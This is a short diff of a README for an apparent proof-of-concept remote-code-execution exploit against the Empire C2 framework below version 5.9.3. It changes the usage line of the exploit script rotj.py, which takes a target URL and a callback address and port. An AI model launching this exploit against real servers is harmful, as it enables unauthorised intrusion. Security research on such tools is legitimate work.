@@ -8,5 +8,5 @@ RCE PoC for Empire C2 framework &lt;5.9.3
 
 ```
 pip install -r requirements.txt
-python3 ./rotj.py '%6DStUJ:~R10h^Ea.@ops?-d{73Cnu>m' 'http://192.168.158.171:80' 127.0.0.1 4444
+python3 ./rotj.py 'http://192.168.158.171:80' 127.0.0.1 4444
 ```
